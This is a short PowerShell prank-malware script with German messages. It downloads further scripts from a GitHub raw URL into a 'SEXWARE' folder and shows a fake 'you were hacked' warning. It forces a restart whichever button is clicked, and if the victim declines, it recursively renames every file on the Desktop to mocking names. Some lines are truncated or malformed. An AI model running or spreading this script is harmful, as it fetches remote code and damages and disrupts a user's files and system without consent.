Invoke-WebRequest 'https://raw.githubusercontent.com/CGGonGitHub/PowershellStuff/main/funnyshutdown/AfterRestart.ps1' -OutFile Documents\SEXWARE\AfterRestart.ps1
Invoke-WebRequest 'https://raw.githubusercontent.com/CGGonGitHub/PowershellStuff/main/funnyshutdown/startup.bat' -OutFile 

Add-Type -AssemblyName PresentationCore, PresentationFramework
$Result = [System.Windows.MessageBox]::Show('Du wurdest gehackt! Willst du jetzt neustarten? >:)' ,'Tschau Kakao' ,'YesNo' ,'Warning')
switch($Result){
    'Yes'{
        "Yes" | Out-File -FilePath \Documents\SEXWARE\YesNo.txt
        shutdown - r-t 10 -c '*Böse Lache* Hahahhaha'
    }
    'No'{
        cd Desktop
        $counter = 0
        Get-ChildItem -Recurse | ForEach-Object {
            $_ | Rename-Item -NewName "DU ENTKOMMST MIR NICHT $(($counter++))$($_.Extension)"
        }
        shutdown - r-t 10 -c 'Hahaha das ist mir sowasvon egal, wird jetzt trotzdem neugestartet :)'
        }
}
